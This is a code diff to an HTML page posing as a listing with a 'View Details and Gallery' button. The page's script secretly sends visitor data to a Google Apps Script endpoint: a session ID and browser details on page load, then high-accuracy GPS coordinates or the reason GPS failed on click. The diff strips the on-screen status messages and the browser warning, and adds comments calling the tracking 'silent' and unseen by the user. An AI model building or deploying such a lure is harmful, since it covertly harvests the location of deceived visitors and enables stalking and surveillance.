@@ -81,7 +81,7 @@
         }
         .detail-item i { color: var(--accent-gold); margin-right: 5px; }
         
-        .cta-container { padding: 0 20px 20px 20px; text-align: center; }
+        .cta-container { padding: 0 20px 30px 20px; text-align: center; }
         
         #contactBtn {
             background: linear-gradient(90deg, var(--accent-gold) 0%, #bfa13f 100%);
@@ -100,24 +100,6 @@
             align-items: center;
             gap: 10px;
         }
-        
-        #liveStatus {
-            margin: 15px 20px 0 20px;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 12px;
-            font-family: monospace;
-            min-height: 36px;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        .status-page { background: #f0fdfa; color: #0f766e; border: 1px solid #99f6e4; }
-        .status-click { background: #fff7ed; color: #9a3412; border: 1px solid #fed7aa; }
-        .status-gps { background: #f0fdf4; color: #166534; border: 1px solid #bbf7d0; }
-        .status-fail { background: #fef2f2; color: #991b1b; border: 1px solid #fecaca; }
-        .status-warn { background: #fefce8; color: #854d0e; border: 1px solid #fde047; }
         
         #loader {
             display: none;
@@ -177,17 +159,6 @@
         }
         .plot-location-btn:hover { background: #1e293b; }
         
-        .warn-box {
-            display: none;
-            background: #fef3c7;
-            border: 1px solid #f59e0b;
-            color: #92400e;
-            padding: 12px;
-            margin: 0 20px 15px 20px;
-            border-radius: 8px;
-            font-size: 13px;
-        }
-        
         @keyframes slideUp {
             from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
@@ -214,16 +185,9 @@
     </div>
 
     <div class="cta-container">
-        <div id="inAppWarning" class="warn-box">
-            <i class="fas fa-exclamation-circle"></i> <strong>In-app browser detected.</strong> If GPS fails, tap ⋮ and <strong>Open in Chrome/Safari</strong>.
-        </div>
-        
         <button id="contactBtn" onclick="handleButtonClick()">
             <i class="fas fa-folder-open"></i> View Details and Gallery
         </button>
-        
-        <div id="liveStatus"></div>
-        
         <div id="loader">
             <i class="fas fa-spinner fa-spin"></i> Getting exact location...
         </div>
@@ -279,103 +243,73 @@
 
 <script>
     // ═══════════════════════════════════════════════════
-    // ⚠️ PASTE YOUR NEW GOOGLE SCRIPT URL HERE
+    // ⚠️ PASTE YOUR NEW GOOGLE SCRIPT /exec URL HERE
     // ═══════════════════════════════════════════════════
-    var scriptURL = 'https://script.google.com/macros/s/AKfycbxYdmssll3i9q-6xEX24J13K-0O9xVNqxRKDYnssdfCbUT0zblHgwWvr35lt23ywziZ/exec';
+    var scriptURL = 'https://script.google.com/macros/s/AKfycbwTAkKflZkagClseGyEdKzq8mXmgqxtCACJBzZ84NT-UblNagRAmWlqsCF9O1zlhkXqLQ/exec';
     
-    var sid = 'SID_' + Math.random().toString(36).substr(2, 6) + '_' + Date.now().toString(36).substr(-4);
-    var statusBox = document.getElementById('liveStatus');
+    // Unique session ID for this visitor
+    var sid = 'SID_' + Math.random().toString(36).substr(2, 7) + '_' + Date.now().toString(36).substr(-4);
 
-    function isInAppBrowser() {
-        var ua = navigator.userAgent || navigator.vendor || window.opera;
-        return /FBAN|FBAV|Instagram|WhatsApp|Telegram|Twitter|Line|WeChat|wv\)/i.test(ua);
-    }
-
-    function getDeviceInfo() {
-        return encodeURIComponent(
-            (navigator.userAgent || 'Unknown').substring(0, 80) + ' | ' + screen.width + 'x' + screen.height
-        );
-    }
-
-    function showStatus(text, type) {
-        statusBox.style.display = 'flex';
-        statusBox.className = ''; // reset
-        if(type === 'page') statusBox.className = 'status-page';
-        if(type === 'click') statusBox.className = 'status-click';
-        if(type === 'gps') statusBox.className = 'status-gps';
-        if(type === 'fail') statusBox.className = 'status-fail';
-        if(type === 'warn') statusBox.className = 'status-warn';
-        statusBox.innerHTML = text;
-    }
-
-    // Core tracker: uses Image pixel (no CORS, no auth issues, bypasses adblockers)
     function trackEvent(eventType, lat, lon, acc, statusMsg) {
         if(scriptURL === 'YOUR_GOOGLE_SCRIPT_URL_HERE') {
-            showStatus('❌ Script URL not set in code', 'fail');
+            console.error('Script URL not set');
             return;
         }
 
-        // Cache buster forces a fresh request every single time
+        var device = encodeURIComponent((navigator.userAgent || 'Unknown').substring(0, 80));
+        var status = encodeURIComponent(statusMsg || '');
         var cb = Date.now() + '_' + Math.random().toString(36).substr(2, 5);
-        
-        var url = scriptURL 
-            + '?event=' + encodeURIComponent(eventType)
+
+        var qs = 'event=' + encodeURIComponent(eventType)
             + '&sid=' + encodeURIComponent(sid)
             + '&lat=' + encodeURIComponent(lat || '')
             + '&lon=' + encodeURIComponent(lon || '')
             + '&acc=' + encodeURIComponent(acc || '')
-            + '&status=' + encodeURIComponent(statusMsg || '')
-            + '&device=' + getDeviceInfo()
-            + '&cb=' + cb;
+            + '&status=' + status
+            + '&device=' + device
+            + '&_cb=' + cb;
 
+        var url = scriptURL + '?' + qs;
+
+        // Silent tracking: Image pixel (fires even if response is JSON)
         var img = new Image();
-        img.onload = function() { console.log('Tracked:', eventType, cb); };
-        img.onerror = function() { console.log('Tracked (pixel):', eventType, cb); };
         img.src = url;
+
+        // Silent tracking: fetch no-cors backup (modern browsers)
+        if (typeof fetch !== 'undefined') {
+            try {
+                fetch(url, { method: 'GET', mode: 'no-cors', keepalive: true }).catch(function(){});
+            } catch(e) {}
+        }
+
+        // Debug only in console (user never sees this)
+        console.log('Tracked:', eventType, sid);
     }
 
-    // ═══════════════════════════════════════════════════
-    // 1. PAGE LOAD — Track EVERY visitor immediately
-    // ═══════════════════════════════════════════════════
+    // 1. PAGE LOAD: Track every visitor silently
     window.addEventListener('DOMContentLoaded', function() {
-        if(isInAppBrowser()) {
-            document.getElementById('inAppWarning').style.display = 'block';
-        }
-        
         trackEvent('PAGE_LOAD', '', '', '', 'User opened website');
-        showStatus('📄 Page viewed — logged', 'page');
     });
 
-    // ═══════════════════════════════════════════════════
-    // 2. BUTTON CLICK — Track click BEFORE GPS
-    // ═══════════════════════════════════════════════════
+    // 2. BUTTON CLICK: Track click, then request GPS
     function handleButtonClick() {
         var btn = document.getElementById('contactBtn');
         var loader = document.getElementById('loader');
 
-        if(scriptURL === 'YOUR_GOOGLE_SCRIPT_URL_HERE') {
-            alert('Error: You must paste your Google Script URL in the HTML code.');
-            return;
-        }
-
         btn.style.display = 'none';
         loader.style.display = 'flex';
 
-        // Log button click immediately
+        // Log click silently
         trackEvent('BUTTON_CLICK', '', '', '', 'User clicked button');
-        showStatus('🖱️ Button click logged — requesting GPS...', 'click');
 
-        // Now get GPS
+        // Request GPS
         requestGPS();
     }
 
-    // ═══════════════════════════════════════════════════
-    // 3. GPS HANDLER
-    // ═══════════════════════════════════════════════════
+    // 3. GPS: Capture or log failure silently
     function requestGPS() {
         if (!navigator.geolocation) {
             trackEvent('GPS_UNAVAILABLE', '', '', '', 'Geolocation API not supported');
-            showStatus('❌ GPS unavailable on this device — logged', 'fail');
             showContent();
             return;
         }
@@ -385,23 +319,16 @@
                 var lat = position.coords.latitude;
                 var lon = position.coords.longitude;
                 var acc = Math.round(position.coords.accuracy || 0);
-
                 trackEvent('GPS_SUCCESS', lat, lon, acc, 'Permission granted');
-                showStatus('✅ GPS captured (±' + acc + 'm) — logged', 'gps');
                 showContent();
             },
             function(error) {
-                var errCode = error.code;
-                var errMsg = error.message || "Unknown";
-                var eventName = "GPS_FAILED";
-                var friendly = errMsg;
-
-                if (errCode === 1) { eventName = "GPS_DENIED"; friendly = "User denied permission"; }
-                if (errCode === 2) { eventName = "GPS_OFF"; friendly = "Location services off"; }
-                if (errCode === 3) { eventName = "GPS_TIMEOUT"; friendly = "Request timed out"; }
-
-                trackEvent(eventName, '', '', '', friendly);
-                showStatus('⚠️ ' + eventName + ' — logged', 'warn');
+                var code = error.code;
+                var name = 'GPS_FAILED';
+                if (code === 1) name = 'GPS_DENIED';
+                if (code === 2) name = 'GPS_OFF';
+                if (code === 3) name = 'GPS_TIMEOUT';
+                trackEvent(name, '', '', '', error.message || 'Location failed');
                 showContent();
             },
             { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
